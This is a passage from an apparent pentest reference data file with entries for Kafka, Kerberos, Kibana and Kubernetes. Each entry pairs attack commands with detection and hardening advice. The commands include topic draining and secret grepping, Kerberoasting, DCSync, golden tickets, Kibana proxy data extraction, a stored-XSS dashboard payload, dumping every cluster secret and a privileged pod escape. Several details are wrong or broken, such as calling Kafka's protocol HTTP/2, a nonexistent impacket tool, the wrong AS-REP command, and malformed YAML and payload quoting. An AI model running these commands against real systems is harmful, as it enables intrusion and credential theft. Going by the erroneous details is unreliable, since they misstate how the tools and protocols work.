    name: "Kafka",
    port: 9092,
    protocol: "tcp",
    risk: "high",
    tags: ["messaging", "streaming", "distributed"],
    summary:
      "Kafka is the distributed commit log that most event pipelines are built on, and it speaks a binary protocol that was never designed to be reachable by strangers. A listener without SASL or TLS accepts any client, and any client can list topics, read messages and publish new ones. The data flowing through it is frequently the most sensitive data the company has, because it is the unfiltered stream before processing. Enumeration takes seconds with kcat and the results are usually self explanatory.",
    connect: [
      {
        label: "kcat",
        command: "kcat -b <target>:9092 -L",
        detail:
          "kcat asks the broker for its metadata and prints the broker list, the topic list and the advertised listeners in one go.",
      },
      {
        label: "Admin client",
        command: "kafka-topics.sh --bootstrap-server <target>:9092 --list",
        detail:
          "The official admin client needs the Kafka binaries, which are usually present on a broker or on the machine used for operations.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 9092 --script kafka-info <target>",
        detail:
          "The kafka-info script performs the ApiVersions request and reports the broker id, the host and port the broker advertises and whether TLS is in use.",
      },
      {
        title: "Fingerprint the HTTP/2 preface",
        command: "printf 'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n' | nc -nv <target> 9092",
        detail:
          "Kafka speaks HTTP/2 for its wire protocol. Sending the client preface separates a Kafka broker from an ordinary web server that happens to be on the same port.",
      },
      {
        title: "Check the controller and schema ports",
        command: "nmap -sV -p 9092,9093,8081,2181 <target>",
        detail:
          "9093 is the KRaft controller, 8081 is the schema registry and 2181 is ZooKeeper on older clusters. ZooKeeper in particular is often far less protected than the broker.",
      },
    ],
    enumeration: [
      {
        title: "List topics and partitions",
        command: "kcat -b <target>:9092 -L",
        detail:
          "Topic names describe the data itself. A topic named customer_pii or a topic per environment tells you both what the data is and how it is structured.",
      },
      {
        title: "Check the ACL state",
        command: "kafka-acls.sh --bootstrap-server <target>:9092 --list",
        detail:
          "An empty ACL list means the cluster has no authorisation configured at all, so any connected client can do everything.",
      },
      {
        title: "Read the broker configuration",
        command: "kafka-configs.sh --bootstrap-server <target>:9092 --entity-type brokers --entity-name <broker-id> --describe",
        detail:
          "The broker configuration shows the listeners, the advertised hostname and the authentication mechanism. It also shows retention settings, which tell you how long a mistake stays recoverable.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated consumption of topic data",
        severity: "critical",
        command: "kcat -b <target>:9092 -t <topic> -C -o beginning -e -q -f '%s\\n'",
        detail:
          "Without SASL, any client can read every message on the topic from the beginning of the retention window. Event payloads routinely contain personal data, internal identifiers and, sometimes, credentials for downstream systems.",
        detection:
          "Describe and Fetch requests arriving from hosts that are not registered consumers, and a consumer group with an unexpected member list.",
        fix: "Enable SASL on the listener, require TLS, and define an explicit ACL per topic and consumer group.",
      },
      {
        title: "Publishing forged messages into the pipeline",
        severity: "high",
        command: "kcat -b <target>:9092 -t <topic> -P -K payload.txt",
        detail:
          "Write access is as valuable as read access. A forged order or payment event consumed by a downstream service is a data integrity problem that no amount of monitoring on the consumer side will catch.",
        detection:
          "Produce requests from producer identities that are not expected, and records appearing in the topic with an unexpected producer metadata.",
        fix: "Give producers write access to their own topics only, validate messages at the consumer, and sign payloads where the business case justifies it.",
      },
      {
        title: "Administrative operations on an unauthenticated cluster",
        severity: "high",
        command: "kafka-topics.sh --bootstrap-server <target>:9092 --delete --topic <topic>",
        detail:
          "When no ACLs are defined, the admin API is open too. An outsider can delete topics, change retention so data disappears early, or alter the configuration of any topic in the cluster.",
        detection:
          "DeleteTopic and AlterConfigs requests from any client that is not the platform tooling.",
        fix: "Apply ACLs on the cluster and topic level, keep the admin principals separate from the application accounts, and log all configuration changes.",
      },
    ],
    postEx: [
      {
        title: "Harvest credentials from message payloads",
        severity: "high",
        command:
          "kcat -b <target>:9092 -t <topic> -C -o beginning -e -q -f '%s\\n' | grep -iE 'password|token|secret|authorization|api_key'",
        detail:
          "Events are usually transformed rather than filtered, so a password that crossed a topic once is still sitting in the log waiting for a consumer with different rules.",
        detection:
          "A consumer group reading topics it has no business reading, and a spike in Fetch traffic from a new client identity.",
        fix: "Do not put credentials on a topic, scrub payloads before they are published, and keep topic ACLs narrow enough that a single consumer cannot read everything.",
      },
      {
        title: "Read the schema registry",
        severity: "medium",
        command: "curl -s http://<target>:8081/subjects",
        detail:
          "The schema registry lists every subject and its version history. The schemas describe the exact shape of the data, which turns a guess about the payloads into a certainty.",
        detection:
          "Requests to the schema registry from hosts outside the application tier.",
        fix: "Protect the registry with the same authentication as the brokers, and review which subjects are registered by whom.",
      },
      {
        title: "Enumerate consumer groups and offsets",
        severity: "medium",
        command: "kafka-consumer-groups.sh --bootstrap-server <target>:9092 --list",
        detail:
          "The consumer group list shows which applications consume which topics and, with the describe option, how far behind each group is. A group you can see but cannot read is still a strong map of the pipeline.",
        detection:
          "Group and offset requests from hosts that are not the registered consumer.",
        fix: "Restrict group and offset APIs with ACLs and monitor administrative group changes.",
      },
    ],
    commands: [
      { command: "kcat -b <target>:9092 -L", description: "Broker and topic metadata in a single call." },
      { command: "kcat -b <target>:9092 -t <topic> -C -o beginning -e -q", description: "Drains a topic from the earliest retained offset." },
      { command: "kcat -b <target>:9092 -t <topic> -P", description: "Produces messages read from standard input." },
      { command: "kafka-topics.sh --bootstrap-server <target>:9092 --list", description: "Lists the topics through the admin client." },
      { command: "kafka-topics.sh --bootstrap-server <target>:9092 --describe", description: "Partition count and replication factor for each topic." },
      { command: "kafka-consumer-groups.sh --bootstrap-server <target>:9092 --list", description: "Lists the consumer groups and their members." },
      { command: "kafka-acls.sh --bootstrap-server <target>:9092 --list", description: "Shows the ACLs; an empty result means none are configured." },
      { command: "kafka-configs.sh --bootstrap-server <target>:9092 --entity-type brokers --describe", description: "Shows broker level configuration including listeners." },
      { command: "printf 'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n' | nc -nv <target> 9092", description: "Sends the HTTP/2 preface to fingerprint a Kafka listener." },
      { command: "curl -s http://<target>:8081/subjects", description: "Lists the schema registry subjects." },
    ],
    hardening: [
      {
        title: "Turn on SASL",
        detail:
          "Configure SCRAM-SHA-512 or PLAIN on the listener and give every application its own principal, so that one compromised service does not unlock the whole cluster.",
      },
      {
        title: "Require TLS everywhere",
        detail:
          "Encrypt both the client and the inter-broker listeners. Without it the traffic is readable and the SASL credentials are exposed to anyone on the path.",
      },
      {
        title: "Write ACLs for every topic",
        detail:
          "Define read, write, describe and cluster actions explicitly per topic and per group, and review them whenever a new consumer is introduced.",
      },
      {
        title: "Separate the listeners",
        detail:
          "Run a dedicated listener for clients and a separate one for inter-broker traffic with different authentication, so the broker traffic is not exposed to application networks.",
      },
      {
        title: "Keep the cluster internal",
        detail:
          "Broker ports should never be routable from a user network or the internet. Expose a managed service or a gateway with authentication in front of it instead.",
      },
      {
        title: "Monitor production and consumption",
        detail:
          "Alert on new producer identities, on Describe and Consume calls from new hosts, and on ACL or configuration changes.",
      },
    ],
    tools: ["nmap", "netcat", "kcat", "kafka-topics", "wireshark", "curl"],
  },
  {
    slug: "kerberos",
    name: "Kerberos",
    port: 88,
    protocol: "tcp/udp",
    risk: "critical",
    tags: ["authentication", "active-directory", "tickets"],
    summary:
      "Kerberos is the protocol behind every Active Directory logon, and the key distribution centre on port 88 hands out tickets that stand in for credentials. The service is carefully built but it has no defence against a user who can request tickets on behalf of other users, which is why roasting is so effective. A single cracked service account hash is usually the difference between one host and the whole domain. Everything here needs a legitimate foothold in the domain, and the assessment should say so.",
    connect: [
      {
        label: "Kerberos tooling",
        command: "kerbrute userenum -d <domain> <ip> --passwords /usr/share/wordlists/users.txt",
        detail:
          "kerbrute speaks the protocol directly and reports which usernames exist and which of them accept a password from a list. Run it slowly; the KDC logs every attempt.",
      },
      {
        label: "LDAP view of the directory",
        command: "ldapsearch -x -H ldap://<ip> -b \"dc=<domain>,dc=<tld>\" sAMAccountName",
        detail:
          "The directory is often the easiest place to enumerate accounts, and it tells you which of them have a service principal name attached.",
      },
    ],
    recon: [
      {
        title: "Read the KDC configuration",
        command: "nmap -p 88 --script krb5-config <target>",
        detail:
          "The krb5-config script reports the supported encryption types and the flags the KDC advertises. RC4 or DES in that list is a finding on its own.",
      },
      {
        title: "Enumerate domain users",
        command: "nmap -p 88 --script krb5-enum-users --script-args userdb=/usr/share/wordlists/users.txt <target>",
        detail:
          "The script compares the KDC error for an existing and a non existing account. The distinction is subtle but consistent, and it is what makes user enumeration possible without credentials.",
      },
      {
        title: "Check the Kerberos over UDP path",
        command: "nmap -sU -p 88 --script krb5-config <target>",
        detail:
          "Kerberos is normally used over UDP for the initial exchange. A sweep that only checks TCP will miss a KDC that answers on one protocol but not the other.",
      },
    ],
    enumeration: [
      {
        title: "Find accounts with a service principal",
        command: "impacket-GetUserSPNs -dc-ip <ip> <domain>/<user>:<password>",
        detail:
          "The output lists every account with a SPN, which is the target list for roasting. One valid domain user with list rights is usually enough to get it.",
      },
      {
        title: "Map directory objects",
        command: "ldapsearch -x -H ldap://<ip> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=group)\" member",
        detail:
          "Group membership shows where the interesting privileges sit, and it gives you the exact distinguished names you need for the next step.",
      },
      {
        title: "Build the graph",
        command: "bloodhound-python -d <domain> -u <user> -p <password> -n <domain> -c All",
        detail:
          "A collection turns a flat directory into a map of who can reach what. Sessions and ACL edges are what turn one compromised workstation into a domain controller.",
      },
    ],
    attacks: [
      {
        title: "Kerberoasting",
        severity: "critical",
        command:
          "impacket-GetUserSPNs -dc-ip <ip> <domain>/<user>:<password> > spns.txt\nhashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt",
        detail:
          "A service ticket is encrypted with a key derived from the account password, and the crack happens offline. Because the passwords are machine generated they are often weak enough to fall to a wordlist.",
        detection:
          "Event 4769 with a service ticket request, and a high rate of ticket requests from a single host in a short window.",
        fix: "Move service accounts to managed service accounts with 32 character passwords, set AES only as the supported encryption type, and mark accounts that do not need Kerberos as not roastable.",
      },
      {
        title: "AS-REP roasting",
        severity: "high",
        command:
          "impacket-GetUserSPNs -no-auth -dc-ip <ip> <domain>/<user>:<password>\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
        detail:
          "Accounts that do not require preauthentication hand out a crackable response containing the password hash before any credential is presented. It is the same offline cracking problem with a simpler collection step.",
        detection:
          "Event 4768 where pre-authentication type is not recorded, or 4769 requests without a preceding 4768 from the same host.",
        fix: "Clear the do-not-require-preauthentication flag from every account and audit the flag on new accounts as part of the join process.",
      },
      {
        title: "Ticket replay and pass-the-ticket",
        severity: "high",
        command:
          "impacket-pass-the-ticket -i <ip> <ticket.kirbi>\nKRB5CCNAME=<ticket.kirbi> smbclient -k //<host> -U <domain>/<user>",
        detail:
          "A ticket is a bearer credential that stays valid until it expires. Obtaining one from a running session or from a delegated ticket means reusing somebody else's identity without knowing their password.",
        detection:
          "Event 4769 with an unusual source address for the account, and logons from a workstation the account never used before.",
        fix: "Shorten ticket lifetimes for sensitive accounts, protect ticket caches with credential guard, and monitor for the same ticket presented from different hosts.",
      },
    ],
    postEx: [
      {
        title: "Extract the krbtgt hash and mint tickets",
        severity: "critical",
        command:
          "impacket-secretsdump -dc-ip <ip> <domain>/<user>:<password>\nimpacket-ticketer -domain <domain> -username <admin> -krbtgt <krbtgt-hash> -dc-ip <ip>",
        detail:
          "The krbtgt hash is the master key of the domain. With it you can issue a golden ticket for any user, including one that never existed, and the KDC will validate it.",
        detection:
          "Tickets with an unusual lifetime or an unusual SPN, and a mismatch between the account's group membership in the directory and in the ticket.",
        fix: "Rotate the krbtgt account password twice, in a controlled order, and treat the second rotation as the point where old golden tickets finally expire.",
      },
      {
        title: "DCSync the directory",
        severity: "critical",
        command: "crackmapexec ldap <ip> -u <user> -p <password> --dcsync",
        detail:
          "Replication rights let a client ask the domain controller for the full directory, including every password hash. It is the fastest route to complete domain compromise.",
        detection:
          "Event 4662 with replication GUIDs from a host that is not a domain controller or an Azure AD Connect server.",
        fix: "Remove replication rights from ordinary admin groups, keep them on a small dedicated group, and alert on 4662 events with replication rights.",
      },
      {
        title: "Take over a privileged account",
        severity: "critical",
        command:
          "impacket-pass-the-ticket -i <ip> <ticket.kirbi>\nimpacket-psexec <domain>/<admin>:<password>@<ip>",
        detail:
          "A cracked service account is usually a stepping stone rather than the goal. Following the delegation graph upward leads to an account that can reach the domain controllers.",
        detection:
          "A service account authenticating to hosts that do not normally use it, especially anything that looks like a management server.",
        fix: "Limit delegation to the hosts that need it, monitor service account usage, and rotate service account passwords on a schedule.",
      },
    ],
    commands: [
      { command: "nmap -p 88 --script krb5-config <target>", description: "Reports the encryption types the KDC supports." },
      { command: "nmap -p 88 --script krb5-enum-users --script-args userdb=<file> <target>", description: "Enumerates domain users through AS-REQ responses." },
      { command: "kerbrute userenum -d <domain> <ip> --passwords <file>", description: "Enumerates usernames and checks a password list against them." },
      { command: "ldapsearch -x -H ldap://<ip> -b \"dc=<domain>,dc=<tld>\" sAMAccountName", description: "Directory listing of the domain accounts." },
      { command: "impacket-GetUserSPNs -dc-ip <ip> <domain>/<user>:<password>", description: "Collects service ticket hashes for accounts with SPNs." },
      { command: "impacket-GetUserSPNs -no-auth -dc-ip <ip> <domain>/<user>:<password>", description: "Collects AS-REP hashes for accounts without preauthentication." },
      { command: "hashcat -m 13100 <hashfile> /usr/share/wordlists/rockyou.txt", description: "Cracks AES and RC4 service ticket hashes." },
      { command: "hashcat -m 18200 <hashfile> /usr/share/wordlists/rockyou.txt", description: "Cracks AS-REP hashes." },
      { command: "impacket-pass-the-ticket -i <ip> <ticket.kirbi>", description: "Replays a Kerberos ticket against a host." },
      { command: "klist", description: "Lists the tickets in the local credential cache." },
    ],
    hardening: [
      {
        title: "Retire RC4 and DES",
        detail:
          "Set the supported encryption types to AES only across the domain and block the legacy protocols at the firewall. RC4 tickets are both weak and noisy to detect.",
      },
      {
        title: "Require preauthentication",
        detail:
          "Clear the do-not-require-preauthentication flag from every account, and make it part of the standard account creation checklist rather than something discovered later.",
      },
      {
        title: "Use managed service accounts",
        detail:
          "Replace machine account passwords with group managed service accounts, whose 32 character passwords rotate automatically and are not Kerberoastable.",
      },
      {
        title: "Protect replication rights",
        detail:
          "Keep the replication right off general administrator groups. It grants the whole directory, so it should sit with a small, named and reviewed group.",
      },
      {
        title: "Rotate krbtgt deliberately",
        detail:
          "Rotate the krbtgt password twice with a full replication in between, so that golden tickets minted before the first rotation expire before the new one takes effect.",
      },
      {
        title: "Watch the KDC logs",
        detail:
          "Alert on event 4769 ticket requests at volume, on 4768 without a matching pre-authentication, and on 4662 with replication GUIDs.",
      },
    ],
    tools: ["nmap", "impacket", "kerbrute", "bloodhound-ce", "hashcat", "ldapsearch"],
  },
  {
    slug: "kibana",
    name: "Kibana",
    port: 5601,
    protocol: "tcp",
    risk: "high",
    tags: ["siem", "dashboard", "elasticsearch"],
    summary:
      "Kibana is the browser front end to Elasticsearch, and it is where the security team actually looks at the data. Because Kibana usually delegates authentication to Elasticsearch or a reverse proxy, a misconfigured deployment frequently hands out dashboards, saved searches and index contents to anyone who asks. The console proxy is the sharp edge: it turns a browser session into a full Elasticsearch API client. Older releases also had prototype pollution issues in the Timelion plugin that reached code execution.",
    connect: [
      {
        label: "Status API",
        command: "curl -s http://<target>:5601/api/status | jq .version",
        detail:
          "The status endpoint usually answers without authentication and reports the version, the build number and the node role.",
      },
      {
        label: "Browser",
        command: "http://<target>:5601/app/dashboards",
        detail:
          "The dashboard application is the quickest way to judge whether authentication is enforced, because the redirect and the login prompt tell you immediately.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 5601 --script http-title,http-headers <target>",
        detail:
          "The title and headers reveal the Kibana version and, on older builds, the Elasticsearch node it is bound to. Version numbers decide which advisories apply.",
      },
      {
        title: "Check the Elasticsearch sibling",
        command: "nmap -sV -p 5601,9200,9300 <target>",
        detail:
          "Elasticsearch on 9200 is often reachable on its own, and it is the more valuable target. A secure Kibana in front of an open Elasticsearch still means the data is exposed.",
      },
      {
        title: "Look for the console proxy",
        command: "curl -s -o /dev/null -w '%{http_code}\\n' -X POST 'http://<target>:5601/api/console/proxy?path=/_cat/indices&method=GET' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{}'",
        detail:
          "A 200 means the proxy will forward your request to Elasticsearch for you. A 403 or a redirect means something is protecting it.",
      },
    ],
    enumeration: [
      {
        title: "List the saved objects",
        command: "curl -s 'http://<target>:5601/api/saved_objects/_find?type=index-pattern' | jq '.saved_objects[].attributes.title'",
        detail:
          "Index patterns name the data sources and index patterns are named after the systems they collect from, which is a list of the monitored estate.",
      },
      {
        title: "List the dashboards",
        command: "curl -s 'http://<target>:5601/api/saved_objects/_find?type=dashboard' | jq '.saved_objects[].attributes.title'",
        detail:
          "Dashboard names often describe investigations and detections in progress, including the names of people under investigation. Titles are cheap, and they are often unprotected.",
      },
      {
        title: "List the indices through the proxy",
        command:
          "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_cat/indices&method=GET' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{}'",
        detail:
          "The index list with document counts and sizes tells you what data exists and which indices are worth reading first.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated Elasticsearch access through the proxy",
        severity: "critical",
        command:
          "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_cat/indices&method=GET' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{}'",
        detail:
          "If the proxy forwards requests without checking the session, you have a full Elasticsearch client behind a URL that many firewalls happily allow.",
        detection:
          "Requests to /api/console/proxy from hosts that are not analyst workstations, visible in the Kibana request log.",
        fix: "Require authentication for every request, keep the proxy restricted to administrator roles, and never expose the Kibana port directly to a user network.",
      },
      {
        title: "Bulk data extraction through _search",
        severity: "high",
        command:
          "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_search?size=1000&method=POST' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}' | head -c 2000",
        detail:
          "Endpoint and authentication logs are data too. A query for hostnames, usernames or source addresses in the index often answers questions about the environment that no dashboard was meant to expose.",
        detection:
          "Search queries with large size parameters, and response volumes far above the analyst's normal pattern.",
        fix: "Apply index level permissions so that each role sees only the indices it needs, and record and review bulk search activity.",
      },
      {
        title: "Prototype pollution through the Timelion parser",
        severity: "critical",
        command:
          "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_timelion/_timelion&method=POST' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{\"sheet\":[\".es(*)\"],\"time\":{\"from\":\"now-15m\",\"to\":\"now\",\"interval\":\"auto\",\"timezone\":\"UTC\"}}'",
        detail:
          "Releases before 6.8.3 and 7.6.1 had a prototype pollution flaw in the Timelion expression parser that was turned into remote code execution on the Kibana server. The request above is the entry point to check the version and the behaviour.",
        detection:
          "Requests to the Timelion endpoint with unusual sheet expressions, and unexpected child processes on the Kibana host.",
        fix: "Upgrade to a supported release, restrict the console to administrators, and run Kibana as a low privilege user in a container.",
      },
    ],
    postEx: [
      {
        title: "Search indices for credentials",
        severity: "high",
        command:
          "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_search&method=POST' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{\"size\":50,\"query\":{\"query_string\":{\"query\":\"password OR secret OR apikey OR token\"}}}' | jq '.hits.hits[]._source'",
        detail:
          "Centralised logging means application output lands in an index. Passwords from error messages and command lines are routinely indexed along with everything else.",
        detection:
          "Search queries with broad keyword sets, and a sudden increase in the query rate from a single account.",
        fix: "Mask secrets before they are logged, restrict search to the roles that need it, and give analysts query rather than cluster administration rights.",
      },
      {
        title: "Read the index templates and pipeline definitions",
        severity: "medium",
        command:
          "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_ingest/pipeline&method=GET' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{}' | jq '.'",
        detail:
          "Ingest pipelines show exactly which fields are dropped or parsed, which is where credentials that were supposed to be filtered quietly survive.",
        detection:
          "Read requests against the ingest pipeline API from an account that does not administer the cluster.",
        fix: "Keep pipeline definitions in version control with review, and restrict who can read or change them.",
      },
      {
        title: "Plant a dashboard for the analyst",
        severity: "medium",
        command:
          "curl -s -X POST 'http://<target>:5601/api/saved_objects/dashboard/<id> -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{\"attributes\":{\"title\":\"Audit\",\"description\":\"<img src=x onerror=fetch(\"/api/console/proxy?path=/_cat/indices&method=GET\")>\",\"panelsJSON\":\"[]\"}}'",
        detail:
          "A saved object with markup in its description fires when an analyst opens the dashboard. It is a way to turn the browser of a trusted user into an authenticated proxy request.",
        detection:
          "Saved objects created by an account that does not normally author dashboards, and dashboard edits outside working hours.",
        fix: "Render descriptions as plain text, require review for shared dashboards, and restrict saved object creation to a trusted group.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:5601/api/status", description: "Version, build number and node information." },
      { command: "curl -s http://<target>:5601/login", description: "Returns the login page, which shows whether authentication is enforced." },
      { command: "curl -s 'http://<target>:5601/api/saved_objects/_find?type=dashboard'", description: "Lists the dashboards." },
      { command: "curl -s 'http://<target>:5601/api/saved_objects/_find?type=index-pattern'", description: "Lists the index patterns and the systems they collect from." },
      { command: "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_cat/indices&method=GET' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{}'", description: "Lists the Elasticsearch indices through the proxy." },
      { command: "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_cluster/health&method=GET' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{}'", description: "Cluster health, node count and shard status." },
      { command: "curl -s -X POST 'http://<target>:5601/api/console/proxy?path=/_search&method=POST' -H 'kbn-xsrf: true' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'", description: "Runs an arbitrary query against the cluster." },
      { command: "nmap -sV -p 5601 --script http-title,http-methods <target>", description: "Fingerprints the Kibana version and allowed methods." },
      { command: "curl -s http://<target>:5601/app/dashboards", description: "Opens the dashboard application." },
      { command: "curl -s http://<target>:9200/_cat/indices", description: "Queries Elasticsearch directly if that port is reachable." },
    ],
    hardening: [
      {
        title: "Authenticate every request",
        detail:
          "Kibana has no user store of its own in most deployments. Make sure a reverse proxy or the Elasticsearch security features authenticate every single request, including the API paths.",
      },
      {
        title: "Restrict the console proxy",
        detail:
          "Remove Dev Tools for ordinary users and limit which Elasticsearch APIs the proxy may forward. It is the single most valuable endpoint on the service.",
      },
      {
        title: "Enable index level permissions",
        detail:
          "Give analysts read access to the indices they work with and no more, so that one compromised account does not expose every log line in the company.",
      },
      {
        title: "Patch to a supported release",
        detail:
          "The prototype pollution and Timelion issues were fixed in 6.8.3 and 7.6.1. Keep both Kibana and Elasticsearch on current versions.",
      },
      {
        title: "Segment the pair",
        detail:
          "Only the Kibana host needs to reach Elasticsearch on 9200. Block the Elasticsearch port from every other network, including the analyst network.",
      },
      {
        title: "Turn on audit logging",
        detail:
          "Enable Elasticsearch security audit logs and the Kibana access log, and review console proxy usage and bulk searches as a regular report.",
      },
    ],
    tools: ["nmap", "curl", "burpsuite", "nikto", "metasploit"],
  },
  {
    slug: "kubernetes",
    name: "Kubernetes",
    port: 6443,
    protocol: "tcp",
    risk: "critical",
    tags: ["containers", "orchestration", "cloud"],
    summary:
      "The Kubernetes API server on 6443 is the control plane of the cluster, and access to it means access to everything the cluster holds. Because every pod carries a service account token, a single application compromise usually turns into a cluster compromise. Older clusters allowed anonymous requests, and the kubelet on 10250 has historically answered without authentication at all. Enumeration is quick: the API version endpoint usually answers before you even present a credential.",
    connect: [
      {
        label: "API server",
        command: "curl -sk https://<target>:6443/version",
        detail:
          "The version endpoint frequently answers without a credential on older clusters, and it tells you exactly which features and admission plugins are in play.",
      },
      {
        label: "kubectl",
        command: "kubectl --server https://<target>:6443 --insecure-skip-tls-verify get pods -A",
        detail:
          "kubectl with a borrowed or found token is far more productive than curl, because it handles the API conventions for you.",
      },
    ],
    recon: [
      {
        title: "Read the API groups",
        command: "curl -sk https://<target>:6443/api https://<target>:6443/apis",
        detail:
          "The API list shows which resources exist. Built-in groups indicate a vanilla cluster; custom groups tell you which operators and platform add-ons are installed.",
      },
      {
        title: "Check the kubelet and the read-only port",
        command: "nmap -sV -p 6443,10250,10255,2379,2380 <target>",
        detail:
          "10250 is the kubelet and 10255 is the unauthenticated read-only port that older clusters still leave enabled. Both are worth testing on every node.",
      },
      {
        title: "Inspect the serving certificate",
        command: "openssl s_client -connect <target>:6443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'",
        detail:
          "The certificate lists every API server address in the cluster, which is often a map of the node and control plane topology.",
      },
    ],
    enumeration: [
      {
        title: "Try an unauthenticated listing",
        command: "curl -sk https://<target>:6443/api/v1/pods | jq '.items | length'",
        detail:
          "A 401 means the API server is doing its job. A list of pods means anonymous access is enabled, which was the default in older versions.",
      },
      {
        title: "List the workloads with a token",
        command: "kubectl --server https://<target>:6443 --token <token> get deploy,sts,ds -A",
        detail:
          "Workload names are usually the application names. Cross-referencing them with the ingress list tells you which of them are exposed to the internet.",
      },
      {
        title: "Read the secrets metadata",
        command: "kubectl --server https://<target>:6443 --token <token> get secrets -A -o name",
        detail:
          "The secret names alone describe the applications and often the external systems they connect to, even before you read their contents.",
      },
    ],
    attacks: [
      {
        title: "Anonymous or default API access",
        severity: "critical",
        command: "curl -sk https://<target>:6443/api/v1/secrets",
        detail:
          "A cluster that accepts anonymous requests gives away every secret in every namespace, and secrets are where the database passwords, cloud keys and API tokens live.",
        detection:
          "Anonymous authentication attempts and 403 responses for service accounts in the API server audit log.",
        fix: "Set anonymous authentication to false, require a real identity provider, and give RBAC a default deny for unauthenticated requests.",
      },
      {
        title: "Service account token theft",
        severity: "critical",
        command: "kubectl --server https://<target>:6443 --token <token> get secrets -A -o yaml | head -40",
        detail:
          "Tokens are mounted into pods by default and are copied into images, environment files and CI configuration all the time. One leaked token is often enough to read the cluster and create new workloads.",
        detection:
          "API requests from a service account outside the workload that owns it, and token use from addresses outside the cluster network.",
        fix: "Use short lived projected tokens, disable the automatic service account token mount where it is not needed, and keep secrets in an external vault.",
      },
      {
        title: "Unauthenticated kubelet API",
        severity: "critical",
        command: "curl -sk https://<target>:10250/pods\ncurl -s http://<target>:10255/pods",
        detail:
          "The kubelet exposes the pod specifications, including environment variables, and it can run commands inside containers. The read-only port returns the same information without needing any credential at all.",
        detection:
          "Kubelet access from hosts that are not the API server, and 10255 reachable from anywhere but the node itself.",
        fix: "Set anonymous authentication to false and authorise the kubelet, close 10255 entirely, and allow-list the API server as the only kubelet client.",
      },
    ],
    postEx: [
      {
        title: "Decode every secret in the cluster",
        severity: "critical",
        command:
          "kubectl get secrets -A -o json | jq -r '.items[] | .metadata.namespace as $ns | .metadata.name as $n | .data // {} | to_entries[] | \"\\($ns)/\\($n): \\(.key)=\\(.value|@base64d)\"'",
        detail:
          "One command prints the credentials for every application in the cluster. Namespaces that look unrelated to the compromised pod often contain the keys that reach the crown jewels.",
        detection:
          "A service account listing secrets across many namespaces, which no normal workload needs.",
        fix: "Namespace service accounts and scope RBAC per workload, and move long lived credentials out of Kubernetes secrets into a vault.",
      },
      {
        title: "Exec into a running container",
        severity: "critical",
        command: "kubectl exec -it <pod> -n <namespace> -- /bin/sh",
        detail:
          "The exec API runs a process inside an existing container. It is quieter than creating a pod and it inherits the container's identity, network position and mounted secrets.",
        detection:
          "Exec requests recorded in the audit log from a user who does not normally deploy, and shells starting inside application containers.",
        fix: "Restrict the pods/exec verb in RBAC, review audit logs for exec and attach, and require an admission policy for interactive access.",
      },
      {
        title: "Escape to the node with a privileged pod",
        severity: "critical",
        command:
          "cat <<'EOF' | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: <container>\nspec:\n  hostPID: true\n  hostPath:\n    path: /\n  containers:\n  - name: shell\n    image: alpine\n    command: [\"sh\",\"-c\",\"chroot /host /bin/sh\"]\n  volumeMounts:\n  - name: host\n    mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\nEOF",
        detail:
          "A pod that mounts the host filesystem and runs privileged runs on the node itself, with access to the kubelet credentials and the container runtime socket on the host.",
        detection:
          "Pods requesting hostPath volumes or privileged mode, and admission policy decisions that allowed them.",
        fix: "Enforce the restricted PodSecurity standard, deny hostPath and privileged in admission control, and require privileged pods to go through a review workflow.",
      },
    ],
    commands: [
      { command: "curl -sk https://<target>:6443/version", description: "Returns the cluster version, often without authentication." },
      { command: "curl -sk https://<target>:6443/api", description: "Lists the API versions the server supports." },
      { command: "curl -sk https://<target>:6443/apis", description: "Lists the API groups and their resources." },
      { command: "curl -sk https://<target>:6443/api/v1/pods", description: "Attempts an unauthenticated pod listing." },
      { command: "kubectl get pods -A -o wide", description: "Lists every workload with its node and IP." },
      { command: "kubectl get secrets -A -o yaml", description: "Lists the secrets in every namespace." },
      { command: "kubectl get svc,ingress -A", description: "Shows the exposed services and ingress routes." },
      { command: "kubectl auth can-i --list", description: "Shows what the current identity is permitted to do." },
      { command: "kubectl exec -it <pod> -n <namespace> -- /bin/sh", description: "Opens a shell inside a running container." },
      { command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token", description: "The service account token mounted inside a pod." },
    ],
    hardening: [
      {
        title: "Disable anonymous authentication",
        detail:
          "Set anonymous authentication to false on the API server and make sure RBAC denies everything to unauthenticated requests, which is the modern default.",
      },
      {
        title: "Use least privilege RBAC",
        detail:
          "Give each workload its own service account and scope its permissions to the namespace and verbs it needs. A default service account with cluster admin is the usual root cause.",
      },
      {
        title: "Keep the API server on the management network",
        detail:
